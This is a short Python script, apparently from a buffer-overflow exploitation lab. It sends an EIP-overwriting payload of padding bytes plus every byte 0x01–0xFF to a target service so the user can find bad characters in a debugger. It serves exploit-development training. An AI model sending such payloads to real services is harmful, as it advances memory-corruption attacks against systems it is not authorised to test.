# useful for checking how a program handles characters

import socket
import sys

# Target configuration
ip = "192.168.1.100"  # Replace with target IP
port = 1337            # Replace with target port

# Offset to EIP determined from your pattern analysis
offset = 2606          # Replace with your specific offset
prefix = b"OVERFLOW1 " # Command prefix if required by the protocol


# Generate all bad characters from 0x01 to 0xFF (excluding 0x00 if sent separately)
# Or use bytes(range(1, 256)) for 0x01-0xFF
badchars = bytes(range(1, 256)) #initial with no bad chars yet

# Adjust to enerate bad characters excluding 0x00 and others found during process
#badchars = bytes([i for i in range(1, 256) if i not in [0x0A]])

# Construct payload: Offset 'A's + Overwritten EIP ('B's) + Bytearray payload
payload = b"A" * offset + b"B" * 4 + badchars

# Wrap in try-except block to handle connection errors gracefully
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("[*] Sending payload with bad characters...")
    s.send(prefix + payload)
    s.close()
    print("[+] Check memory dump in debugger.")
  
except socket.error:
    print("[-] Could not connect to the target server.")
    sys.exit(1)
